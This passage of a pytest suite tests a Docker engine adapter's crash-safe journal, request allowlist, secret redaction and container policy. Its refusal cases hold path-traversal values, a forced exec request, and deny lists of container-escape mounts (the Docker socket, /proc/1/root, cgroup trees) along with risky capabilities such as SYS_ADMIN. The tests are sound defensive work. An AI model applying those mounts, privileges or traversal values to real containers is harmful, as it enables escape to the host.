    elif kind == "network-config":
        world.daemon.networks[NETWORK_ID]["Internal"] = True
    elif kind == "image-gone":
        world.daemon.images.clear()
    elif kind == "env-file":
        Path(world.plan.profiles["api"].environment.path).write_bytes(b'{"VKM_SECRET_PROBE":"rotated"}')
    elif kind == "daemon-id":
        world.daemon.info["ID"] = "OTHER:DAEMON:IDENTITY"
    else:
        world.daemon.containers[ident]["State"].update(Running=True, Pid=77, Status="running")
    with pytest.raises((E.EngineContractDrift, E.EngineOwnershipError, E.EngineUnavailable)):
        engine.start("api")
    assert world.daemon.started == [] and "START_INTENT" not in phases(world.journal)


# ------------------------------------------------------- lost ACK / 409 / partial --

def test_timeout_after_the_daemon_created_inspects_and_never_creates_again(world):
    def lost(request, doc):
        raise httpx.ReadTimeout("lost", request=request)
    world.daemon.hooks["after_create"] = lost
    engine = world.adapter()
    ident = engine.create("api")
    assert len(world.daemon.creates()) == 1 and world.daemon.created == [ident]
    assert phases(world.journal)[-2:] == ["CREATE_ADOPTED", "POST_CREATE_VERIFIED"]
    assert engine.create("api") == ident and len(world.daemon.creates()) == 1


def test_timeout_without_creation_waits_for_the_recorded_deadline_before_a_new_intent(world):
    calls = []

    def lost(request, name, body):
        if not calls:
            calls.append(name)
            raise httpx.ConnectError("dropped", request=request)
    world.daemon.hooks["before_create"] = lost
    engine = world.adapter()
    with pytest.raises(E.EngineCreateAmbiguous):
        engine.create("api")
    with pytest.raises(E.EngineCreateAmbiguous):
        world.adapter().create("api")  # resumed process, still inside the deadline: no second request
    assert len(world.daemon.creates()) == 1
    world.clock.now += world.plan.create_timeout_seconds + 1
    ident = world.adapter().create("api")
    assert len(world.daemon.creates()) == 2 and world.daemon.created == [ident]
    assert phases(world.journal).count("CREATE_INTENT") == 2 and "CREATE_ABSENT" in phases(world.journal)


def test_duplicate_create_409_adopts_only_the_exact_attempt_candidate(world):
    def duplicate(request, name, body):
        ident = world.daemon.new_id()
        world.daemon.containers[ident] = world.daemon.materialize(ident, name, body)
        world.daemon.created.append(ident)
        return httpx.Response(409, json={"message": "Conflict"})
    world.daemon.hooks["before_create"] = duplicate
    engine = world.adapter()
    ident = engine.create("api")
    assert world.daemon.created == [ident] and len(world.daemon.creates()) == 1
    record = records(world.journal)[-2]
    assert record["phase"] == "CREATE_ADOPTED" and record["detail"]["reason"] == "NAME_CONFLICT_INSPECTED"


def test_duplicate_create_409_with_a_foreign_container_is_refused_without_cleanup(world):
    def foreign(request, name, body):
        world.daemon.containers["9" * 64] = legacy_doc("api", "9" * 64)
        return httpx.Response(409, json={"message": "Conflict"})
    world.daemon.hooks["before_create"] = foreign
    engine = world.adapter()
    with pytest.raises(E.EngineOwnershipError):
        engine.create("api")
    assert phases(world.journal)[-1] == "CREATE_ABSENT"
    assert engine.remove_owned() == [] and "9" * 64 in world.daemon.containers and world.daemon.deleted == []


def test_409_without_a_visible_occupant_stays_pending_and_a_late_create_is_adopted(world):
    """F2: a reserved name (409) with inspect 404 is never recorded as ABSENT."""
    held, calls = {}, {"n": 0}

    def before(request, name, body):
        calls["n"] += 1
        if calls["n"] == 1:
            held["late"] = (name, body)  # the daemon keeps creating after the client gave up
            raise httpx.ReadTimeout("lost", request=request)
        return httpx.Response(409, json={"message": "Conflict"})  # name still reserved by the in-flight create
    world.daemon.hooks["before_create"] = before
    engine = world.adapter()
    with pytest.raises(E.EngineCreateAmbiguous):
        engine.create("api")
    world.clock.now += world.plan.create_timeout_seconds + 1
    with pytest.raises(E.EngineCreateAmbiguous):
        engine.create("api")
    assert phases(world.journal).count("CREATE_ABSENT") == 1 and phases(world.journal)[-1] == "CREATE_INTENT"
    name, body = held["late"]
    ident = world.daemon.new_id()
    world.daemon.containers[ident] = world.daemon.materialize(ident, name, body)
    world.daemon.hooks.clear()
    assert engine.create("api") == ident  # our own exact attempt candidate, never "foreign"
    assert phases(world.journal)[-2:] == ["CREATE_ADOPTED", "POST_CREATE_VERIFIED"]
    assert engine.remove_owned() == [ident] and phases(world.journal)[-1] == "ATTEMPT_CLOSED"


def test_late_occupant_after_absent_is_owned_for_removal_only_and_never_started(world):
    """F2: after a deadline-based ABSENT, a late attempt candidate is owned, removable, not startable."""
    held = {}

    def lost(request, name, body):
        held["late"] = (name, body)
        raise httpx.ReadTimeout("daemon still creating", request=request)
    world.daemon.hooks["before_create"] = lost
    engine = world.adapter()
    with pytest.raises(E.EngineCreateAmbiguous):
        engine.create("api")
    world.daemon.hooks.clear()
    world.clock.now += world.plan.create_timeout_seconds + 1
    assert engine.remove_owned() == [] and phases(world.journal)[-2:] == ["CREATE_ABSENT", "ATTEMPT_CLOSED"]
    name, body = held["late"]
    ident = world.daemon.new_id()
    world.daemon.containers[ident] = world.daemon.materialize(ident, name, body)
    with pytest.raises(E.EngineOwnershipError):
        engine.create("api")  # occupant of attempt 1 recorded as owned; nothing is started
    assert "OCCUPANT_OWNED" in phases(world.journal) and world.daemon.started == []
    with pytest.raises(E.EngineOwnershipError):
        engine.start("api")
    assert engine.remove_owned() == [ident] and world.daemon.deleted == [ident]
    second = engine.create("api")  # attempt 2 only discovered and removed the late occupant
    assert world.daemon.containers[second]["Config"]["Labels"][E.LABEL_ATTEMPT] == engine.attempt_id(3)


@pytest.mark.parametrize("created", [True, False])
def test_partial_create_daemon_error_is_owned_only_for_rollback(world, created):
    def partial(request, doc):
        return httpx.Response(500, json={"message": "network attach failed"})

    def refused(request, name, body):
        return httpx.Response(500, json={"message": "refused"})
    world.daemon.hooks["after_create" if created else "before_create"] = partial if created else refused
    engine = world.adapter()
    with pytest.raises(E.EngineCreateError):
        engine.create("api")
    assert phases(world.journal)[-1] == ("CREATE_PARTIAL" if created else "CREATE_ABSENT")
    with pytest.raises(E.EngineOwnershipError):
        engine.start("api")
    assert engine.remove_owned() == world.daemon.created == world.daemon.deleted
    assert phases(world.journal)[-1] == "ATTEMPT_CLOSED"


@pytest.mark.parametrize("exact", [True, False])
def test_already_existing_owned_candidate_is_adopted_only_if_exact(world, exact):
    def died(request, doc):
        if not exact:
            drift("env")(request, doc)
        raise Crash("process died before the create ACK")
    world.daemon.hooks["after_create"] = died
    with pytest.raises(Crash):
        world.adapter().create("api")
    world.daemon.hooks.clear()
    engine = world.adapter()
    if exact:
        assert engine.create("api") == world.daemon.created[0]
        assert phases(world.journal)[-2:] == ["CREATE_ADOPTED", "POST_CREATE_VERIFIED"]
    else:
        with pytest.raises(E.EngineContractDrift):
            engine.create("api")
        assert phases(world.journal)[-1] == "CREATE_PARTIAL"
        assert engine.remove_owned() == world.daemon.created == world.daemon.deleted
    assert len(world.daemon.creates()) == 1


def test_occupant_created_before_the_recorded_intent_is_not_attributed(world):
    with pytest.raises(Crash):
        world.adapter(fault=crash_at("CREATE_INTENT")).create("api")
    engine = world.adapter()
    body = E.create_body(world.plan.profiles["api"], E.ownership_labels(engine.attempt_id(1), "api",
                         world.plan.profiles["api"].sha256), DEFAULT_ENV["api"])
    ident = world.daemon.new_id()
    world.daemon.containers[ident] = world.daemon.materialize(ident, "vkm-core-api-1", body)
    world.daemon.containers[ident]["Created"] = rfc3339(world.clock.now - 3600)  # predates our intent
    with pytest.raises(E.EngineOwnershipError):
        engine.create("api")
    world.clock.now += 1000
    with pytest.raises(E.EngineCreateAmbiguous):
        engine.remove_owned()
    assert world.daemon.deleted == [] and ident in world.daemon.containers


# --------------------------------------------------------------- resume --

def test_crash_before_post_create_inspect_resumes_without_a_second_create(world):
    with pytest.raises(Crash):
        world.adapter(fault=crash_at("CREATE_ACK")).create("api")
    ident = world.adapter().create("api")
    assert world.daemon.created == [ident] and len(world.daemon.creates()) == 1
    assert phases(world.journal)[-1] == "POST_CREATE_VERIFIED"


@pytest.mark.parametrize("phase", ["POST_CREATE_VERIFIED", "START_INTENT", "after-start"])
def test_crash_before_start_ack_resumes_with_exactly_one_start(world, phase):
    if phase == "after-start":
        world.daemon.hooks["after_start"] = lambda request, item: (_ for _ in ()).throw(Crash("died"))
        world.adapter().create("api")
        with pytest.raises(Crash):
            world.adapter().start("api")
        world.daemon.hooks.clear()
    else:
        with pytest.raises(Crash):
            engine = world.adapter(fault=crash_at(phase))
            engine.create("api")
            engine.start("api")
    ident = world.adapter().start("api")
    assert world.daemon.started == [ident] and phases(world.journal)[-1] == "STARTED"
    assert world.adapter().start("api") == ident and world.daemon.started == [ident]


def test_crash_after_create_intent_before_the_request_resolves_only_after_deadline(world):
    with pytest.raises(Crash):
        world.adapter(fault=crash_at("CREATE_INTENT")).create("api")
    assert world.daemon.creates() == []
    with pytest.raises(E.EngineCreateAmbiguous):
        world.adapter().remove_owned()
    world.clock.now += world.plan.create_timeout_seconds + 1
    assert world.adapter().remove_owned() == []
    assert phases(world.journal)[-2:] == ["CREATE_ABSENT", "ATTEMPT_CLOSED"]


# ----------------------------------------------------- stale / foreign journal --

def test_changed_profile_sha_or_preserved_set_cannot_reuse_the_journal(world):
    engine = world.adapter()
    ident = engine.create("api")
    changed = make_plan(world.root, env={**DEFAULT_ENV["api"], "VKM_SECRET_PROBE": SENTINEL + "-rotated"})
    assert changed.profiles["api"].sha256 != world.plan.profiles["api"].sha256
    for stale in (world.adapter(plan=changed), world.adapter(preserved=("3" * 64,))):
        with pytest.raises(E.EngineJournalError):
            stale.create("api")
        with pytest.raises(E.EngineJournalError):
            stale.start("api")
        with pytest.raises(E.EngineJournalError):
            stale.remove_owned()
    assert world.daemon.started == [] and world.daemon.deleted == [] and ident in world.daemon.containers


def test_pending_create_with_another_profile_label_is_refused(world):
    with pytest.raises(Crash):
        world.adapter(fault=crash_at("CREATE_INTENT")).create("api")
    engine = world.adapter()
    impostor = legacy_doc("api", "9" * 64)
    impostor["Config"]["Labels"] = {E.LABEL_ATTEMPT: engine.attempt_id(1), E.LABEL_UNIT: "api", E.LABEL_PROFILE: "f" * 64}
    impostor["Created"] = rfc3339(world.clock.now + 1)
    world.daemon.containers[impostor["Id"]] = impostor
    with pytest.raises(E.EngineOwnershipError):
        engine.create("api")
    world.clock.now += 1000
    with pytest.raises(E.EngineCreateAmbiguous):
        engine.remove_owned()
    assert world.daemon.deleted == [] and impostor["Id"] in world.daemon.containers


def test_rolled_back_attempt_can_never_be_started_or_promoted(world):
    engine = world.adapter()
    engine.create("api")
    engine.remove_owned()
    with pytest.raises(E.EngineOwnershipError):
        engine.start("api")
    with pytest.raises(E.EngineOwnershipError):
        engine.expected_pin("api")
    assert engine.current("api") is None and world.daemon.started == []
    second = engine.create("api")
    assert world.daemon.containers[second]["Config"]["Labels"][E.LABEL_ATTEMPT] == engine.attempt_id(2)


# ------------------------------------------------------------------ journal --

@pytest.mark.parametrize("damage", ["torn", "edited", "reordered", "replaced-inode", "hardlink"])
def test_journal_damage_fails_closed(world, damage):
    engine = world.adapter()
    engine.create("api")
    path = Path(world.journal)
    data = path.read_bytes()
    lines = data.splitlines(keepends=True)
    if damage == "torn":
        path.write_bytes(data + b'{"schema":')
    elif damage == "edited":
        path.write_bytes(data.replace(b'"api"', b'"mcp"', 1))
    elif damage == "reordered":
        path.write_bytes(b"".join([lines[0], lines[2], lines[1], *lines[3:]]))
    elif damage == "replaced-inode":
        path.unlink()
        path.write_bytes(data)
    else:
        os.link(path, path.with_name("second-name.jsonl"))
    with pytest.raises(E.EngineJournalError):
        engine.remove_owned()
    assert world.daemon.deleted == []


def test_deleted_journal_with_a_live_candidate_is_detected_not_treated_as_fresh(world):
    """F7: a lost journal never silently becomes 'nothing was created'."""
    engine = world.adapter()
    ident = engine.create("api")
    Path(world.journal).unlink()
    with pytest.raises(E.EngineJournalError):
        world.adapter().remove_owned()
    assert ident in world.daemon.containers and world.daemon.deleted == []


def test_empty_journal_after_a_crash_in_creation_blocks_rollback_without_any_effect(world):
    Path(world.journal).parent.mkdir(parents=True, exist_ok=True)
    Path(world.journal).write_bytes(b"")  # O_EXCL create durable, header write lost
    with pytest.raises(E.EngineJournalError):
        world.adapter().remove_owned()
    assert world.daemon.requests == []


def test_journal_and_its_directory_are_private(world):
    world.adapter().create("api")
    if os.name == "posix":
        assert stat.S_IMODE(Path(world.journal).stat().st_mode) == 0o600
        assert stat.S_IMODE(Path(world.journal).parent.stat().st_mode) == 0o700
    assert Path(world.journal).parent.parent == world.root


# ------------------------------------------------------------- allowlist --

def test_non_allowlisted_method_or_path_is_impossible(world):
    engine = world.adapter()
    t = engine.engine
    for name in ("pull", "build", "exec", "request", "compose", "kill", "rename", "update", "send", "post", "delete"):
        assert not hasattr(t, name)
    refused = [lambda: t._request("exec", params={"container_id": "1" * 64}),
               lambda: t._request("create", query=(("name", "vkm-core-api-1"),)),
               lambda: t._request("inspect", params={"ref": "../images/create"}),
               lambda: t._request("remove", params={"container_id": "1" * 64}, query=(("force", "true"), ("v", "false"))),
               lambda: t._request("stop", params={"container_id": "1" * 64}, query=(("signal", "KILL"),)),
               lambda: t._request("info", params={"ref": "x"}),
               lambda: t.inspect("vkm-core-mcp-admin-1"), lambda: t.inspect("vkm-first-live-retained-x-api"),
               lambda: t.image("vkm/core:latest"), lambda: t.network("vkm_net"),
               lambda: t.start("vkm-core-api-1"), lambda: t.remove("vkm-core-api-1"),
               lambda: t.create("vkm-core-api-1/../../images", {"Image": IMAGE}, timeout=1)]
    for call in refused:
        with pytest.raises(E.EngineRequestRefused):
            call()
    assert world.daemon.requests == []
    for bad in ("1.40", "2.0"):
        with pytest.raises(E.EngineRequestRefused):
            EngineTransport(bad, transport=world.daemon.transport())
    for socket in ("relative.sock", "/var/run/../docker.sock", "/var/run/docker"):
        with pytest.raises(E.EngineRequestRefused):
            EngineTransport("1.44", transport=world.daemon.transport(), socket_path=socket)


def test_every_effect_is_allowlisted_and_remove_is_never_forced(world):
    engine = world.adapter()
    for unit in ("api", "mcp"):
        engine.create(unit)
    engine.start("api")
    engine.remove_owned()
    deletes = [q for m, _, q in world.daemon.requests if m == "DELETE"]
    assert deletes and all(q == {"force": "false", "v": "false"} for q in deletes)
    assert {m for m, _, _ in world.daemon.requests} <= {"GET", "POST", "DELETE"}


def test_native_transport_requires_qualified_linux_socket(monkeypatch):
    monkeypatch.setattr(E.sys, "platform", "win32")
    with pytest.raises(E.EngineUnavailable):
        EngineTransport("1.44")


def test_oversized_or_redirected_engine_responses_are_refused(world):
    t = EngineTransport("1.44", transport=httpx.MockTransport(lambda r: httpx.Response(200, content=b"{" + b" " * 70000 + b"}")),
                        max_response_bytes=65536)
    with pytest.raises(E.EngineUnavailable):
        t.version()
    t = EngineTransport("1.44", transport=httpx.MockTransport(lambda r: httpx.Response(307, headers={"Location": "/v1.44/x"})))
    with pytest.raises(E.EngineUnavailable):
        t.version()
    t = EngineTransport("1.44", transport=httpx.MockTransport(lambda r: httpx.Response(200, content=b'{"a":1,"a":2}')))
    with pytest.raises(E.EngineUnavailable):
        t.version()


def test_slow_drip_response_hits_the_total_monotonic_deadline():
    """N2: per-read timeouts alone cannot let a dripping response run unbounded."""
    ticks = {"now": 0.0}

    class Drip(httpx.SyncByteStream):
        def __iter__(self):
            for _ in range(10):
                ticks["now"] += 4.0  # each read is fast enough, the total is not
                yield b" "

    t = EngineTransport("1.44", transport=httpx.MockTransport(lambda r: httpx.Response(200, stream=Drip())),
                        timeout_seconds=15, _monotonic=lambda: ticks["now"])
    with pytest.raises(E.EngineOutcomeUnknown):
        t.version()
    assert ticks["now"] <= 20.0


# ---------------------------------------------------------------- secrets --

def test_secret_env_value_never_appears_in_exceptions_journal_or_receipts(world):
    texts = []

    def capture(call):
        try:
            call()
        except (Exception, Crash) as exc:
            texts.extend([str(exc), repr(exc), "".join(traceback.format_exception(exc))])
        else:
            pytest.fail("expected a refusal")
    world.daemon.hooks["after_create"] = drift("env")
    engine = world.adapter()
    capture(lambda: engine.create("api"))  # post-create drift: VERIFY_FAILED
    capture(lambda: engine.create("api"))  # owned drifted candidate only allows rollback
    capture(lambda: engine.start("api"))
    engine.remove_owned()
    world.daemon.hooks["after_create"] = lambda request, doc: httpx.Response(500, json={"message": SENTINEL})
    capture(lambda: engine.create("api"))  # partial create with a daemon message echoing the secret
    engine.remove_owned()
    world.daemon.hooks.clear()
    world.daemon.version["Version"] = "1.0.0"
    capture(lambda: world.adapter().create("mcp"))
    world.daemon.version["Version"] = "27.3.1"
    world.daemon.containers["9" * 64] = legacy_doc("mcp", "9" * 64)
    capture(lambda: engine.create("mcp"))  # foreign same-name container
    del world.daemon.containers["9" * 64]
    ident = engine.create("api")
    receipts = [engine.expected_pin("api"), engine.observe("api", running=False)[1], engine.start("api"),
                engine.remove_owned()]
    capture(lambda: EngineCreateProfile(**{**world.plan.profiles["api"].model_dump(), "labels": {"com.docker.compose.project": "x"}}))
    capture(lambda: EngineCreatePlan(api_version="1.44", daemon=DAEMON, profiles={"api": world.plan.profiles["api"]}))
    texts += [repr(world.plan), str(world.plan), repr(world.plan.profiles["api"]), canonical_bytes(receipts).decode(),
              canonical_bytes(world.plan).decode()]
    journal = Path(world.journal).read_bytes()
    # Meaningful negative: the secret really was sent to (and stored by) the daemon.
    assert all(SENTINEL in "".join(body["Env"]) for body in world.daemon.bodies) and len(world.daemon.bodies) >= 3
    assert all(SENTINEL not in t for t in texts) and SENTINEL.encode() not in journal
    assert ident in receipts[-1]


@pytest.mark.parametrize("damage", ["bytes", "names", "missing"])
def test_environment_file_drift_refuses_before_any_effect_without_echoing_values(world, damage):
    path = Path(world.plan.profiles["api"].environment.path)
    plan = world.plan
    if damage == "bytes":
        path.write_bytes(path.read_bytes().replace(b"production", b"producti0n"))
    elif damage == "names":
        plan = make_plan(world.root, env_names=("VKM_API_PROFILE",))  # SHA-pinned file has more names
    else:
        path.unlink()
    with pytest.raises(E.EngineContractDrift) as caught:
        world.adapter(plan=plan).create("api")
    assert SENTINEL not in str(caught.value) and world.daemon.mutations() == []
    assert not Path(world.journal).exists()


def test_secret_never_reaches_the_intent_or_any_file_under_the_control_root(world):
    """F1: intent, FIRST_LIVE_INTENT.json (0600), engine journal and every control-root file stay secret-free."""
    from vkm_corpus.update.first_live import FirstLiveIntent
    intent = FirstLiveIntent.model_validate(intent_value(world.tmp))
    assert SENTINEL.encode() not in canonical_bytes(intent)
    assert all(not hasattr(p, "env") for p in intent.engine_create.profiles.values())
    controller = object.__new__(FirstLiveController)
    controller.root = world.root
    controller.journal = NS(_path=lambda name: world.root / name)
    controller._write("FIRST_LIVE_INTENT.json", canonical_bytes(intent))
    adapter, _ = native_rig(world)
    adapter.candidate_start(partial=True)
    adapter.legacy_restore()
    world.daemon.hooks["after_create"] = drift("env")
    with pytest.raises(E.EngineContractDrift):
        adapter.candidate_start(partial=True)
    world.daemon.hooks.clear()
    adapter.legacy_restore()
    files = [p for p in world.root.rglob("*") if p.is_file()]
    assert Path(world.journal) in files and world.root / "FIRST_LIVE_INTENT.json" in files
    assert all(SENTINEL.encode() not in p.read_bytes() for p in files)
    assert any(SENTINEL.encode() in Path(p.environment.path).read_bytes() for p in world.plan.profiles.values())
    if os.name == "posix":
        assert stat.S_IMODE((world.root / "FIRST_LIVE_INTENT.json").stat().st_mode) == 0o600


# --------------------------------------------------- first-LIVE intent binding --

def intent_value(tmp_path, *, production=False):
    from vkm_corpus.update.bootstrap import BootstrapNetwork
    from vkm_corpus.update.contracts import ComponentIdentity, ServiceIdentity
    from vkm_corpus.update.first_live import (CandidateDocuments, FirstLiveIntent, LegacyFile, LegacyRecoveryBoundary,
        RestoredLegacySelector, RetainedSharedObserver)
    from vkm_corpus.update.frontdoor import FrontdoorProfile
    from vkm_corpus.update.operator import OperatorRelease
    from vkm_corpus.update.operator_units import ComposeRelease, UnitControlConfig
    authority, root = tmp_path / "authority", tmp_path / "runtime" / "served"
    plan = make_plan(root)
    ref = lambda name, c="a": BoundFile(path=str(authority / name), sha256=c * 64)
    docs = {k: ref(k + ".json", c) for k, c in zip(("compose", "environment", "runtime", "native", "policy", "context"), "abcdef")}
    docs["environment"] = plan.profiles["api"].environment
    bundle = CandidateDocuments(documents=docs, effective={u: ref(u + ".effective.json") for u in ("api", "mcp")},
                                opaque={"mcp-engine-environment": plan.profiles["mcp"].environment})
    pins = {u: UnitPin(image_id=IMAGE, config_sha256="c" * 64) for u in ("api", "mcp")}
    release = ComposeRelease(compose=docs["compose"], project="vkm-core", units=pins, runtime_config_sha256="a" * 64,
        code_sha256="a" * 64, dependencies_sha256="a" * 64, access_sha256="a" * 64, mcp_read_principal_sha256="a" * 64)
    selector = ref("restored-policy.json", "e")
    restored = [ref("legacy-compose.json"), ref("observer-env.json"), ref("observer-runtime.json"), ref("observer-native.json"), selector]
    legacy = dict(restore_compose=restored[0], units=pins, original_container_ids=ORIGINALS, selectors=(docs["policy"],),
        restored_files=tuple(LegacyFile(file=r, bytes=10) for r in restored), independent_copy=ref("copy.json"),
        independent_restore=ref("restore.json", "b"), source_failure_domain="source", backup_failure_domain="independent",
        shared_services_sha256="a" * 64)
    front = dict(scope="SYNTHETIC", nft=BoundFile(path=str(authority / "nft"), sha256="a" * 64), tcp_ports=(8000, 8765, 18000, 18765))
    extra = {}
    if production:
        service = ServiceIdentity(service="CONTROL", **dict.fromkeys(("instance_sha256", "code_sha256", "dependencies_sha256",
            "config_sha256", "endpoint_sha256", "runtime_sha256"), "c" * 64))
        component = ComponentIdentity(component="DOCUMENT", revision="snap", manifest_sha256="a" * 64,
            policy_sha256="b" * 64, built_from={})
        legacy.update(scope="RECEIVER_CONTROL_ONLY", owner_approval=ref("approval.json"),
            selector_restores=(RestoredLegacySelector(source=docs["policy"], restored=selector),),
            observer=RetainedSharedObserver(environment=restored[1], runtime=restored[2], native=restored[3],
                duckdb=ref("canon.duckdb"), nav=ref("nav.duckdb"), max_local_identity_bytes=1000,
                components=(component,), services=(service,)))
        front.update(scope="FIRST_LIVE_PRODUCTION", ip=BoundFile(path=str(authority / "ip"), sha256="a" * 64),
            tc=BoundFile(path=str(authority / "tc"), sha256="a" * 64), trusted_bridges=("br-vkm",))
        extra = dict(boot_registration=ref("boot.json"), boot_checkpoint=ref("checkpoint.json"))
    control = UnitControlConfig(scope="PRODUCTION_SWITCH" if production else "SYNTHETIC",
        docker=BoundFile(path=str(authority / "docker"), sha256="a" * 64),
        compose_binary=BoundFile(path=str(authority / "docker-compose"), sha256="a" * 64),
        docker_socket=str(tmp_path / "docker.sock"), control_root=str(root), receiver_url="http://127.0.0.1:18000",
        mcp_receiver_url="http://127.0.0.1:18765", operator_token_file=str(authority / "token"), releases=(release,))
    intent = FirstLiveIntent(scope="FIRST_LIVE_PRODUCTION" if production else "SYNTHETIC", request_id="engine-intent",
        candidate=ref("generation.json"), shadow_operator=docs["runtime"], shadow_acceptance=docs["context"],
        shadow_plan=ref("plan.json"), shadow_documents=bundle, live_documents=bundle, mappings=(),
        legacy=LegacyRecoveryBoundary(**legacy), candidate_release=release,
        release=OperatorRelease(receiver_release_sha256=release.sha256, environment=docs["environment"],
            runtime=docs["runtime"], generation=ref("generation.json"), acceptance_plan=ref("plan.json")),
        units=control, frontdoor=FrontdoorProfile(**front),
        networks=(BootstrapNetwork(name="vkm_net", network_id=NETWORK_ID, config_sha256=network_fingerprint(NETWORK)),),
        engine_create=plan, authority_root=str(authority), qualification_root=str(tmp_path / "qualification"),
        protected_roots=(str(tmp_path / "originals"),), operator_code_sha256="a" * 64,
        operator_dependencies_sha256="b" * 64, operator_commit="c" * 40, **extra)
    return intent.model_dump(mode="json")


@pytest.mark.parametrize("production", [False, True])
def test_intent_binds_the_exact_engine_plan_and_production_requires_it(tmp_path, production):
    from vkm_corpus.update.first_live import FirstLiveIntent
    value = intent_value(tmp_path, production=production)
    intent = FirstLiveIntent.model_validate(value)
    assert intent.engine_create.profiles["api"].env_names == tuple(sorted(DEFAULT_ENV["api"]))
    assert SENTINEL not in json.dumps(value)
    without = {**value, "engine_create": None}
    if production:
        with pytest.raises(ValueError, match="Engine-create plan"):
            FirstLiveIntent.model_validate(without)
    else:
        assert FirstLiveIntent.model_validate(without).engine_create is None


def add_mount(profile_value, source, target, read_only):
    profile_value["mounts"].append({"type": "bind", "source": str(source), "target": target, "read_only": read_only})


@pytest.mark.parametrize("mutation,message", [
    ("image", "qualified candidate pin"), ("network", "pinned external network"), ("network-config", "pinned external network"),
    ("port", "typed receiver bindings"), ("extra-port", "typed receiver bindings"), ("gate-mount", "shared gate"),
    ("control-rw", "writable control"), ("control-subdir-rw", "writable control"), ("journal-rw", "writable control"),
    ("authority", "sealed roots"), ("authority-parent", "sealed roots"), ("qualification", "sealed roots"),
    ("protected", "sealed roots"), ("engine-socket", "Engine socket"), ("engine-socket-parent", "Engine socket"),
    ("env-not-in-graph", "approved live control document"), ("api-env-not-release", "approved live control document"),
    ("mcp-gets-api-env", "approved live control document"), ("mcp-env-other-document", "approved live control document"),
    ("mcp-env-missing", "approved live control document")])
def test_intent_rejects_engine_profiles_outside_the_qualified_pins_and_mount_policy(tmp_path, mutation, message):
    from vkm_corpus.update.first_live import FirstLiveIntent
    value = intent_value(tmp_path)
    api, mcp = value["engine_create"]["profiles"]["api"], value["engine_create"]["profiles"]["mcp"]
    root = Path(value["units"]["control_root"])
    if mutation == "image":
        api["image"] = "sha256:" + "c" * 64
    elif mutation == "network":
        value["networks"] = []
    elif mutation == "network-config":
        value["networks"][0]["config_sha256"] = "f" * 64
    elif mutation == "port":
        api["port_bindings"][0]["host_port"] = 18001
    elif mutation == "extra-port":
        api["port_bindings"].append({**api["port_bindings"][0], "host_ip": "192.0.2.10"})
    elif mutation == "gate-mount":
        api["mounts"] = [m for m in api["mounts"] if not m["source"].endswith("admission.lock")]
    elif mutation == "control-rw":
        api["mounts"][0]["read_only"] = False
    elif mutation == "control-subdir-rw":
        add_mount(mcp, root / "tmp", "/rw-control", False)
    elif mutation == "journal-rw":
        add_mount(mcp, root / "first-live-engine", "/journal", False)
    elif mutation == "authority":
        add_mount(mcp, value["authority_root"], "/authority", True)
    elif mutation == "authority-parent":
        add_mount(mcp, tmp_path, "/everything", True)
    elif mutation == "qualification":
        add_mount(mcp, value["qualification_root"], "/qual", False)
    elif mutation == "protected":
        add_mount(mcp, value["protected_roots"][0], "/originals", True)
    elif mutation == "engine-socket":
        add_mount(mcp, value["units"]["docker_socket"], "/var/run/docker.sock", False)
    elif mutation == "engine-socket-parent":
        value["units"]["docker_socket"] = str(root.parent.parent / "sockets" / "docker.sock")
        add_mount(mcp, root.parent.parent / "sockets", "/sockets", True)
    elif mutation == "env-not-in-graph":
        mcp["environment"] = {"path": str(tmp_path / "authority" / "other.json"), "sha256": "f" * 64}
    elif mutation == "mcp-gets-api-env":  # R4: the read MCP must never receive the API's (secret) environment
        mcp["environment"], mcp["env_names"] = api["environment"], api["env_names"]
    elif mutation == "mcp-env-other-document":
        mcp["environment"] = value["live_documents"]["documents"]["policy"]
    elif mutation == "mcp-env-missing":
        mcp["environment"], mcp["env_names"] = None, []
    else:
        api["environment"] = value["live_documents"]["opaque"]["mcp-engine-environment"]
        api["env_names"] = mcp["env_names"]
    with pytest.raises(ValueError, match=message) as caught:
        FirstLiveIntent.model_validate(value)
    assert SENTINEL not in str(caught.value) and SENTINEL not in repr(caught.value)


@pytest.mark.parametrize("update", [
    {"user": "0:0"}, {"user": "0:10001"}, {"user": "10001:0"}, {"user": "root"}, {"user": "10001"},
    {"cap_add": ("SYS_ADMIN",)}, {"cap_add": ("SYS_PTRACE",)}, {"cap_add": ("DAC_READ_SEARCH",)},
    {"restart_policy": {"name": "always"}}, {"restart_policy": {"name": "unless-stopped"}},
    {"restart_policy": {"name": "on-failure", "maximum_retry_count": 3}}])
def test_profile_refuses_root_added_capabilities_and_daemon_restarts(tmp_path, update):
    """F4/F6: non-root numeric user, reviewed capabilities only, restart policy 'no'."""
    with pytest.raises(ValueError):
        profile("api", tmp_path / "runtime" / "served", **update)


@pytest.mark.parametrize("source", ["/var/run/docker.sock", "/run/docker.sock", "/var/run", "/run", "/", "/proc",
    "/proc/1/root", "/sys/fs/cgroup", "/dev", "/run/containerd/containerd.sock", "/var/lib/containerd",
    "/srv/other.sock"])
def test_engine_socket_and_system_trees_are_never_mountable(source, tmp_path):
    """F6: refused by policy on POSIX; on Windows a POSIX path is not an absolute host path at all."""
    assert E.forbidden_host_path(source)
    with pytest.raises(ValueError):
        EngineMount(source=source, target="/x", read_only=True)
    with pytest.raises(ValueError):
        EngineMount(source=str(tmp_path), target="/proc/sys" if source == "/" else "/dev/shm", read_only=True)
    assert not E.forbidden_host_path("/srv/vkm/served") and not E.forbidden_host_path("/var/lib/vkm")


def test_plan_refuses_mounts_of_the_pinned_engine_data_root(world):
    data = world.root.parent / "data"
    assert E._posix_under("/var/lib/docker/volumes/x", "/var/lib/docker") and E._posix_under("/var/lib/docker", "/var")
    if str(data).startswith("/"):  # POSIX host paths; a Windows host path can never equal a Linux data root
        for root_dir in (str(data), str(data / "docker"), str(data.parent)):
            with pytest.raises(ValueError, match="data root"):
                make_plan(world.root, daemon=DAEMON.model_copy(update={"docker_root_dir": root_dir}))


@pytest.mark.parametrize("host_ip,approved,ok", [("0.0.0.0", False, False), ("::", False, False), ("", False, False),
    ("0.0.0.0", True, True), ("192.0.2.10", False, True), ("192.0.2.10", True, False), ("127.000.0.1", False, False)])
def test_port_bindings_need_explicit_host_ips(host_ip, approved, ok):
    build = lambda: EnginePortBinding(container_port=8000, host_ip=host_ip, host_port=18000,
                                      unspecified_host_ip_approved=approved)
    if ok:
        assert build().host_ip == host_ip
    else:
        with pytest.raises(ValueError):
            build()


@pytest.mark.parametrize("update", [
    {"labels": {"com.docker.compose.project": "vkm-core"}}, {"labels": {"org.vkm.first-live.attempt": "x"}},
    {"image": "vkm/core:latest"}, {"privileged": True}, {"cap_drop": ("NET_RAW",)}, {"name": "vkm-core-mcp-1"},
